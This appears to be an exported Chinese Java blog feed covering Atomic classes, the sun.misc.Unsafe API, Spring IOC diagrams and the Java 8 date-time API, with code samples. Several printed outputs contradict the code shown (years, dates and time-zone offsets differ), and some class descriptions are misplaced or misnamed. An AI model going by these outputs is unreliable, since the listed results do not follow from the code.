先把Boolean转换成整型，再使用compareAndSwapInt进行CAS，所以原子更新double也可以用类似的思路来实现。</p><p><strong>2、原子更新数组类</strong></p><p>通过原子的方式更新数组里的某个元素，Atomic包提供了以下三个类：</p><ul><li>AtomicIntegerArray：原子更新整型数组里的元素。</li><li>AtomicLongArray：原子更新长整型数组里的元素。</li><li>AtomicReferenceArray：原子更新引用类型数组里的元素。</li><li>AtomicIntegerArray类主要是提供原子的方式更新数组里的整型，</li></ul><p>其常用方法如下</p><ul><li>int addAndGet(int i, int delta)：以原子方式将输入值与数组中索引i的元素相加。</li><li>boolean compareAndSet(int i, int expect, int update)：如果当前值等于预期值，则以原子方式将数组位置i的元素设置成update值。</li></ul><p><strong>3、原子更新引用类型</strong></p><p>原子更新基本类型的AtomicInteger，只能更新一个变量，如果要原子的更新多个变量，就需要使用这个原子更新引用类型提供的类。Atomic包提供了以下三个类：</p><ul><li>AtomicReference：原子更新引用类型。</li><li>AtomicReferenceFieldUpdater：原子更新引用类型里的字段。</li><li>AtomicMarkableReference：原子更新带有标记位的引用类型。可以原子的更新一个布尔类型的标记位和引用类型。构造方法是AtomicMarkableReference(V initialRef, boolean initialMark)</li></ul><p><strong>4、原子更新字段类</strong></p><p>如果我们只需要某个类里的某个字段，那么就需要使用原子更新字段类，Atomic包提供了以下三个类：</p><ul><li>AtomicIntegerFieldUpdater：原子更新整型的字段的更新器。</li><li>AtomicLongFieldUpdater：原子更新长整型字段的更新器。</li><li>AtomicStampedReference：原子更新带有版本号的引用类型。该类将整数值与引用关联起来，可用于原子的更数据和数据的版本号，可以解决使用CAS进行原子更新时，可能出现的ABA问题。原子更新字段类都是抽象类，每次使用都时候必须使用静态方法newUpdater创建一个更新器。原子更新类的字段的必须使用public volatile修饰符。</li></ul><h2 id="四、Unsafe魔法类"><a href="#四、Unsafe魔法类" class="headerlink" title="四、Unsafe魔法类"></a>四、Unsafe魔法类</h2><p>Unsafe是位于sun.misc包下的一个类，主要提供一些用于执行低级别、不安全操作的方法，如直接访问系统内存资源、自主管理内存资源等，这些方法在提升Java运行效率、增强Java语言底层资源操作能力方面起到了很大的作用。但由于Unsafe类使Java语言拥有了类似C语言指针一样操作内存空间的能力，这无疑也增加了程序发生相关指针问题的风险。在程序中过度、不正确使用Unsafe类会使得程序出错的概率变大，使得Java这种安全的语言变得不再“安全”，因此对Unsafe的使用一定要慎重。</p><p>Unsafe类为一单例实现，提供静态方法getUnsafe获取Unsafe实例，当且仅当调用getUnsafe方法的类为引导类加载器所加载时才合法，否则抛出SecurityException异常。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">复制</span><br><span class="line">public class Unsafe &#123; &#x2F;&#x2F; 单例对象 </span><br><span class="line">    private static final Unsafe theUnsafe;</span><br><span class="line"></span><br><span class="line">    private Unsafe() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @CallerSensitive</span><br><span class="line">    public static Unsafe getUnsafe() &#123;</span><br><span class="line">        Class var0 &#x3D; Reflection.getCallerClass();</span><br><span class="line">        &#x2F;&#x2F;仅在引导类加载器&#96;BootstrapClassLoader&#96;加载时才合法 </span><br><span class="line">        if (!VM.isSystemDomainLoader(var0.getClassLoader())) &#123;</span><br><span class="line">            throw new SecurityException(&quot;Unsafe&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return theUnsafe;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>1、如何获取Unsafe实例？</strong></p><ul><li>1、从getUnsafe方法的使用限制条件出发，通过Java命令行命令-Xbootclasspath/a把调用Unsafe相关方法的类A所在jar包路径追加到默认的bootstrap路径中，使得A被 引导类加载器加载，从而通过Unsafe.getUnsafe方法安全的获取Unsafe实例。 java ­Xbootclasspath/a:${path} // 其中path为调用Unsafe相关方法的类所在jar包路径</li><li>2、通过反射获取单例对象theUnsafe。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">复制public class UnsafeInstance &#123;</span><br><span class="line">    public static Unsafe reflectGetUnsafe() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Field field &#x3D; Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            return (Unsafe) field.get(null);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2、Unsafe功能介绍</strong></p><p>Unsafe提供的API大致可分为内存操作、CAS、Class相关、对象操作、线程调度、系统信息获取、内存屏障、数组操作等几类，下面将对其相关方法和应用场景进行详细介绍。</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190816150855.png" alt="微信截图_20190816150855"></p><ul><li>1、内存操作</li></ul><p>这部分主要包含堆外内存的分配、拷贝、释放、给定地址值操作等方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">复制&#x2F;&#x2F;分配内存, 相当于C++的malloc函数 </span><br><span class="line">public native long allocateMemory(long bytes); </span><br><span class="line">&#x2F;&#x2F;扩充内存 </span><br><span class="line">public native long reallocateMemory(long address, long bytes); </span><br><span class="line">&#x2F;&#x2F;释放内存 </span><br><span class="line">public native void freeMemory(long address);</span><br><span class="line">&#x2F;&#x2F;在给定的内存块中设置值 </span><br><span class="line">public native void setMemory(Object o, long offset, long bytes, byte value); </span><br><span class="line">&#x2F;&#x2F;内存拷贝 </span><br><span class="line">public native void copyMemory(Object srcBase, long srcOffset, Object destBase, long destOffset, long bytes); </span><br><span class="line">&#x2F;&#x2F;获取给定地址值，忽略修饰限定符的访问限制。与此类似操作还有: getInt， getDouble，getLong，getChar等 </span><br><span class="line">public native Object getObject(Object o, long offset); </span><br><span class="line">&#x2F;&#x2F;为给定地址设置值，忽略修饰限定符的访问限制，与此类似操作还有: putInt,putDouble，putLong，putChar等 </span><br><span class="line">public native void putObject(Object o, long offset, Object x); </span><br><span class="line">public native byte getByte(long address); </span><br><span class="line">&#x2F;&#x2F;为给定地址设置byte类型的值（当且仅当该内存地址为 allocateMemory分配 时，此方法结果才是确定的） </span><br><span class="line">public native void putByte(long address, byte x);</span><br></pre></td></tr></table></figure><p>通常，我们在Java中创建的对象都处于堆内内存（heap）中，堆内内存是由JVM所管控的Java进程内存，并且它们遵循JVM的内存管理机制，JVM会采用垃圾回收机制统一管理堆内存。与之相对的是堆外内存，存在于JVM管控之外的内存区域，Java中对堆外内存的操作，依赖于Unsafe提供的操作堆外内存的native方法。</p><p>使用堆外内存的原因</p><ul><li>①对垃圾回收停顿的改善。由于堆外内存是直接受操作系统管理而不是JVM，所以当我们使用堆外内存时，即可保持较小的堆内内存规模。从而在GC时减少回收停顿对于应用的影响。</li><li>②提升程序I/O操作的性能。通常在I/O通信过程中，会存在堆内内存到堆外内存的数据拷贝操作，对于需要频繁进行内存间数据拷贝且生命周期较短的暂存数据，都建议存储到堆外内存。</li></ul><p><strong>典型应用</strong></p><p>DirectByteBuffer是Java用于实现堆外内存的一个重要类，通常用在通信过程中做缓冲池，如在Netty、MINA等NIO框架中应用广泛。DirectByteBuffer对于堆外内存的创建、使用、销毁等逻辑均由Unsafe提供的堆外内存API来实现。</p><p>下图为DirectByteBuffer构造函数，创建DirectByteBuffer的时候，通过Unsafe.allocateMemory分配内存、Unsafe.setMemory进行内存初始化，而后构建Cleaner对象用于跟踪DirectByteBuffer对象的垃圾回收，以实现当DirectByteBuffer被垃圾回收时，分配的堆外内存一起被释放。</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190816152128.png" alt="微信截图_20190816152128"></p><ul><li>2、CAS相关</li></ul><p>如下源代码释义所示，这部分主要为CAS相关操作的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">复制&#x2F;**</span><br><span class="line">* CAS</span><br><span class="line">* @param o 包含要修改field的对象 </span><br><span class="line">* @param offset 对象中某field的偏移量 </span><br><span class="line">* @param expected 期望值 </span><br><span class="line">* @param update 更新值 </span><br><span class="line">* @return true | false </span><br><span class="line">*&#x2F;</span><br><span class="line">public final native boolean compareAndSwapObject(Object var1,long var2,Object var4,Object var5);</span><br><span class="line">public final native boolean compareAndSwapInt(Object var1,long var2,int var4,int var5);</span><br><span class="line">public final native boolean compareAndSwapLong(Object var1,long var2,long var4,long var6);</span><br></pre></td></tr></table></figure><p><strong>典型应用</strong></p><p>如下图所示，AtomicInteger的实现中，静态字段valueOffset即为字段value的内存偏移地址，valueOffset的值在AtomicInteger初始化时，在静态代码块中通过Unsafe的objectFieldOffset方法获取。在AtomicInteger中提供的线程安全方法中，通过字段valueOffset的值可以定位到AtomicInteger对象中value的内存地址，从而可以根据CAS实现对value字段的原子操作。</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190816152508.png" alt="微信截图_20190816152508"></p><p>下图为某个AtomicInteger对象自增操作前后的内存示意图，对象的基地址 baseAddress=“0x110000”，通过baseAddress+valueOffset得到value的内存地址valueAddress=“0x11000c”；然后通过CAS进行原子性的更新操作，成功则返回，否则继续重试，直到更新成功为止。</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190816152544.png" alt="微信截图_20190816152544"></p><ul><li>3、线程调度</li></ul><p>包括线程挂起、恢复、锁机制等方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">复制&#x2F;&#x2F;取消阻塞线程 </span><br><span class="line">public native void unpark(Object thread); </span><br><span class="line">&#x2F;&#x2F;阻塞线程 </span><br><span class="line">public native void park(boolean isAbsolute, long time); </span><br><span class="line">&#x2F;&#x2F;获得对象锁（可重入锁） </span><br><span class="line">@Deprecated </span><br><span class="line">public native void monitorEnter(Object o); </span><br><span class="line">&#x2F;&#x2F;释放对象锁 </span><br><span class="line">@Deprecated </span><br><span class="line">public native void monitorExit(Object o); </span><br><span class="line">&#x2F;&#x2F;尝试获取对象锁 </span><br><span class="line">@Deprecated </span><br><span class="line">public native boolean tryMonitorEnter(Object o);</span><br></pre></td></tr></table></figure><p>方法park、unpark即可实现线程的挂起与恢复，将一个线程进行挂起是通过park方法实现的，调用park方法后，线程将一直阻塞直到超时或者中断等条件出现；unpark可以终止一个挂起的线程，使其恢复正常。</p><p><strong>典型应用</strong></p><p>Java锁和同步器框架的核心类AbstractQueuedSynchronizer，就是通过调用LockSupport.park()和LockSupport.unpark()实现线程的阻塞和唤醒的，而LockSupport的park、unpark方法实际是调用Unsafe的park、unpark方式来实现。</p><ul><li>4、内存屏障</li></ul><p>在Java 8中引入，用于定义内存屏障（也称内存栅栏，内存栅障，屏障指令等，是一类同步屏障指令，是CPU或编译器在对内存随机访问的操作中的一个同步点，使得此点之前的所有读写操作都执行后才可以开始执行此点之后的操作），避免代码重排序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">复制&#x2F;&#x2F;内存屏障，禁止load操作重排序。屏障前的load操作不能被重排序到屏 障后，屏障后的load操作不能被重排序到屏障前 </span><br><span class="line">public native void loadFence(); </span><br><span class="line">&#x2F;&#x2F;内存屏障，禁止store操作重排序。屏障前的store操作不能被重排序到屏障后， 屏障后的store操作不能被重排序到屏障前 </span><br><span class="line">public native void storeFence(); </span><br><span class="line">&#x2F;&#x2F;内存屏障，禁止load、store操作重排序 </span><br><span class="line">public native void fullFence();</span><br></pre></td></tr></table></figure><p><strong>典型应用</strong></p><p>在Java 8中引入了一种锁的新机制——StampedLock，它可以看成是读写锁的一个改进版本。StampedLock提供了一种乐观读锁的实现，这种乐观读锁类似于无锁的操作，完全不会阻塞写线程获取写锁，从而缓解读多写少时写线程“饥饿”现象。由于StampedLock提供的乐观读锁不阻塞写线程获取读锁，当线程共享变量从主内存load到线程工作内存时，会存在数据不一致问题，所以当使用StampedLock的乐观读锁时，需要遵从如下图用例中使用的模式来确保数据的一致性。</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190816153050.png" alt="微信截图_20190816153050"></p><p>如上图用例所示计算坐标点Point对象，包含点移动方法move及计算此点到原点的距离的方法distanceFromOrigin。在方法distanceFromOrigin中，首先，通过tryOptimisticRead方法获取乐观读标记；然后从主内存中加载点的坐标值(x,y)；而后通过StampedLock的validate方法校验锁状态，判断坐标点(x,y)从主内存加载到线程工作内存过程中，主内存的值是否已被其他线程通过move方法修改，如果validate返回值为true，证明(x,y)的值未被修改，可参与后续计算；否则，需加悲观读锁，再次从主内存加载(x,y)的最新值，然后再进行距离计算。其中，校验锁状态这步操作至关重要，需要判断锁状态是否发生改变，从而判断之前copy到线程工作内存中的值是否与主内存的值存在不一致。</p><p>下图为StampedLock.validate方法的源码实现，通过锁标记与相关常量进行位运算、比较来校验锁状态，在校验逻辑之前，会通过Unsafe的loadFence方法加入一个load内存屏障，目的是避免上图用例中步骤②和StampedLock.validate中锁状态校验运算发生重排序导致锁状态校验不准确的问题。</p><p><img src="https://mysticalyu.gitee.io/pic/hexo/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20190816153213.png" alt="微信截图_20190816153213"></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring IOC 的世界</title>
      <link href="/springIOC/"/>
      <url>/springIOC/</url>
      
        <content type="html"><![CDATA[<p>Spring IOC</p><a id="more"></a><h1 id="bean-的转换过程"><a href="#bean-的转换过程" class="headerlink" title="bean 的转换过程"></a>bean 的转换过程</h1><p>下面这张图演示了一个可用的 bean 是如何从 xml 配置文件中演变过来的。</p><p> <img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/spring-201901311001.jpg" alt="img"> </p><h1 id="ApplicationContext-的架构图"><a href="#ApplicationContext-的架构图" class="headerlink" title="ApplicationContext 的架构图"></a>ApplicationContext 的架构图</h1><p> <img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/spring-201901311002.jpg" alt="img"> </p><h1 id="loadBean-的全流程"><a href="#loadBean-的全流程" class="headerlink" title="loadBean 的全流程"></a>loadBean 的全流程</h1><p> <img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/spring-201901311003.jpg" alt="img"> </p><h1 id="getBean-的全流程"><a href="#getBean-的全流程" class="headerlink" title="getBean 的全流程"></a>getBean 的全流程</h1><p> <img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/spring-201901311004.jpg" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 8 日期时间 API</title>
      <link href="/Java%208%20%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4%20API/"/>
      <url>/Java%208%20%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4%20API/</url>
      
        <content type="html"><![CDATA[<p>java 8 通过发布新的Date-Time API (JSR 310)来进一步加强对日期和时间的处理。</p> <a id="more"></a><h1 id="Java-8-日期时间-API"><a href="#Java-8-日期时间-API" class="headerlink" title="Java 8 日期时间 API"></a><strong>Java 8 日期时间 API</strong></h1><p>在旧版本的Java中，日期时间API存在诸多问题，其中有:</p><ul><li><strong>非线程安全</strong> - java.util.Date 是非线程安全的，所有的日期类都是可变的，这是Java日期类最大的问题之一。</li><li><strong>设计很差</strong> - Java的日期/时间类的定义并不一致，在java.util和java.sql的包中都有日期类，此外用于格式化和解析的类在java.text包中定义。java.Date同时包含日期和时间，而java.Date仅包含日期，将其纳入java.sql包并不合理，另外这两个类都有相同的名字，本身就是一个非常糟糕的设计。</li><li><strong>时区处理麻烦</strong> - 日期类并不提供国际化，没有时区支持，因此Java引入了java.util.Calenda和java.util.TimeZone类，单他们同样存在上述的所有问题。</li></ul><p>Java 8 在java.time包下提供了很多新的API。以下为两个比较重要的API：</p><ul><li><strong>Local(本地)</strong> - 简化了日期时间的处理，没有时区的问题。</li><li><strong>Zoned(时区)</strong> - 通过制定的时区处理日期时间。</li></ul><p>新的java.time包涵盖了所有处理日期，时间，日期/时间，时区，时刻(instants),过程(during),与时钟(clock)的操作。</p><h2 id="1-本地化日期时间-API"><a href="#1-本地化日期时间-API" class="headerlink" title="1.本地化日期时间 API"></a><strong>1.本地化日期时间 API</strong></h2><p>LocalDate/LocalTime和LocalDateTime类可以在处理时区不是必须的情况。代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Java8Tester</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        Java8Tester java8Tester = <span class="keyword">new</span> Java8Tester();</span><br><span class="line">        java8Tester.testLocalDateTime();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testLocalDateTime</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//获取当前日期时间</span></span><br><span class="line">        LocalDateTime currentTime = LocalDateTime.now();</span><br><span class="line">        System.out.println(<span class="string">&quot;当前时间:&quot;</span>+currentTime);</span><br><span class="line">        LocalDate date1 = currentTime.toLocalDate();</span><br><span class="line">        System.out.println(<span class="string">&quot;date1: &quot;</span>+date1);</span><br><span class="line">        Month month = currentTime.getMonth();</span><br><span class="line">        <span class="keyword">int</span> day = currentTime.getDayOfMonth();</span><br><span class="line">        <span class="keyword">int</span> senconds = currentTime.getSecond();</span><br><span class="line">        System.out.println(<span class="string">&quot;月：&quot;</span>+ month + <span class="string">&quot;，日：&quot;</span> + day + <span class="string">&quot;,秒：&quot;</span> + senconds);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//指定年日 2019/09/10</span></span><br><span class="line">        LocalDateTime date2  = currentTime.withDayOfMonth(<span class="number">10</span>).withYear(<span class="number">2019</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;date2: &quot;</span>+ date2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//指定年月日   2019-11-10</span></span><br><span class="line">        LocalDate date3 = LocalDate.of(<span class="number">2019</span>,Month.NOVEMBER,<span class="number">10</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;date3: &quot;</span>+ date3);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//22时15分钟</span></span><br><span class="line">        LocalTime date4 = LocalTime.of(<span class="number">22</span>,<span class="number">10</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;date4: &quot;</span>+ date4);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//解析字符串</span></span><br><span class="line">        LocalTime date5 = LocalTime.parse(<span class="string">&quot;20:15:30&quot;</span>);</span><br><span class="line">        System.out.println(date5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行以上脚本，输出结果为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">当前时间: <span class="number">2018</span>-<span class="number">06</span>-<span class="number">08</span>T15:<span class="number">19</span>:<span class="number">16.910</span></span><br><span class="line"></span><br><span class="line">date1:<span class="number">2018</span>-<span class="number">06</span>-<span class="number">08</span></span><br><span class="line"></span><br><span class="line">月: JUNE, 日: <span class="number">8</span>, 秒: <span class="number">16</span></span><br><span class="line"></span><br><span class="line">date2:<span class="number">2012</span>-<span class="number">06</span>-<span class="number">10</span>T15:<span class="number">19</span>:<span class="number">16.910</span></span><br><span class="line"></span><br><span class="line">date3:<span class="number">2014</span>-<span class="number">12</span>-<span class="number">12</span></span><br><span class="line"></span><br><span class="line">date4:<span class="number">22</span>:<span class="number">15</span></span><br><span class="line"></span><br><span class="line">date5:<span class="number">20</span>:<span class="number">15</span>:<span class="number">30</span></span><br></pre></td></tr></table></figure><h2 id="2-使用时区的日期时间API"><a href="#2-使用时区的日期时间API" class="headerlink" title="2 使用时区的日期时间API"></a><strong>2 使用时区的日期时间API</strong></h2><p>如果我们需要考虑到时区，就可以使用时区的日期时间API：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Java8Tester</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        Java8Tester java8Tester = <span class="keyword">new</span> Java8Tester();</span><br><span class="line">        java8Tester.testZonedDateTime();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testZonedDateTime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取当前时间日期</span></span><br><span class="line">        ZonedDateTime date1 = ZonedDateTime.parse(<span class="string">&quot;2019-12-03T10:15:30+05:30[Asia/Shanghai]&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;date1: &quot;</span> + date1);</span><br><span class="line">        ZoneId id = ZoneId.of(<span class="string">&quot;Europe/Paris&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;ZoneId: &quot;</span> + id);</span><br><span class="line">        ZoneId currentZone = ZoneId.systemDefault();</span><br><span class="line">        System.out.println(<span class="string">&quot;当期时区: &quot;</span> + currentZone);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行以上脚本，输出结果为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">date1:<span class="number">2015</span>-<span class="number">12</span>-<span class="number">03</span>T10:<span class="number">15</span>:<span class="number">30</span>+<span class="number">08</span>:<span class="number">00</span>[Asia/Shanghai]</span><br><span class="line"></span><br><span class="line">ZoneId:Europe/Paris</span><br><span class="line"></span><br><span class="line">当期时区: Asia/Shanghai</span><br></pre></td></tr></table></figure><h2 id="3-常用代码"><a href="#3-常用代码" class="headerlink" title="3.常用代码"></a><strong>3.常用代码</strong></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">LocalDate today = LocalDate.now();</span><br><span class="line">      System.out.println(<span class="string">&quot;今天的日期是：&quot;</span>+today);</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      <span class="keyword">int</span> year = today.getYear();</span><br><span class="line">      <span class="keyword">int</span> month = today.getMonthValue();</span><br><span class="line">      <span class="keyword">int</span> day = today.getDayOfMonth();</span><br><span class="line">      System.out.println(<span class="string">&quot;年：&quot;</span>+year+<span class="string">&quot;,月：&quot;</span>+month+<span class="string">&quot;,日：&quot;</span>+day);</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      LocalDate birthday = LocalDate.of(<span class="number">2011</span>, <span class="number">11</span>, <span class="number">11</span>);</span><br><span class="line">      System.out.println(<span class="string">&quot;特定日期：&quot;</span>+birthday);</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      System.out.println(<span class="string">&quot;今天的日期是2011-11-11吗？&quot;</span>+today.equals(birthday));</span><br><span class="line">      System.out.println(<span class="string">&quot;-----------------------------&quot;</span>);</span><br><span class="line">      LocalDate dayofbirth = LocalDate.of(<span class="number">2008</span>, <span class="number">11</span>, <span class="number">20</span>);</span><br><span class="line">      LocalDate tday = LocalDate.now();</span><br><span class="line">   <span class="comment">// 获取生日的月、日</span></span><br><span class="line">      MonthDay birthMonthDay = MonthDay.of(dayofbirth.getMonth(), dayofbirth.getDayOfMonth());</span><br><span class="line">      MonthDay currentMonthDay = MonthDay.from(tday);</span><br><span class="line">      <span class="keyword">if</span> (currentMonthDay.equals(birthMonthDay)) &#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;今天是你的生日&quot;</span>);</span><br><span class="line">      